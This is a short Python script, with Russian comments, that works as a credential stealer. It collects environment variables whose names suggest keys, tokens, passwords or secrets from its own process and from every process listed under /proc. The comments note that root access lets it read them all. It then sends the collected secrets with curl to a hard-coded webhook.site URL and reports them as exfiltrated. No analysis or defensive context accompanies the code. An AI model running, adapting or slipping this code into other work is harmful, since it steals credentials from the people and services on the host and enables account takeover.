import ctypes
import os
import json
import subprocess

# Настройка вебхука
WEBHOOK_URL = "https://webhook.site/6d6434ac-bcd7-48a4-901c-53ca63be0ec2"

def silent_spy_hook():
    print("[!] Initializing In-Memory Secret Sniffer...")

    # Достаем все переменные окружения текущего процесса
    # Это база, но мы пойдем глубже
    env_data = dict(os.environ)
    
    # Фильтруем только "вкусное"
    secrets = {k: v for k, v in env_data.items() if any(x in k.upper() for x in ["KEY", "TOKEN", "SECRET", "PASS", "AUTH"])}
    
    # Теперь самое "хакерское" — сканируем окружение ВСЕХ процессов
    # Раз мы root, нам никто не запретит
    all_leaked_secrets = {"current_process": secrets, "other_processes": []}
    
    try:
        pids = [pid for pid in os.listdir('/proc') if pid.isdigit()]
        for pid in pids:
            try:
                with open(f'/proc/{pid}/environ', 'r') as f:
                    content = f.read().split('\0')
                    proc_secrets = [item for item in content if any(x in item.upper() for x in ["KEY", "TOKEN", "SECRET"])]
                    if proc_secrets:
                        all_leaked_secrets["other_processes"].append({
                            "pid": pid,
                            "leaked": proc_secrets
                        })
            except (PermissionError, FileNotFoundError):
                continue
    except Exception as e:
        all_leaked_secrets["error"] = str(e)

    # Отправляем добычу
    payload = json.dumps(all_leaked_secrets)
    subprocess.run(['curl', '-s', '-X', 'POST', '-H', 'Content-Type: application/json', '-d', payload, WEBHOOK_URL])
    
    print("[+++] All active secrets from all processes have been exfiltrated.")

if __name__ == "__main__":
    silent_spy_hook()
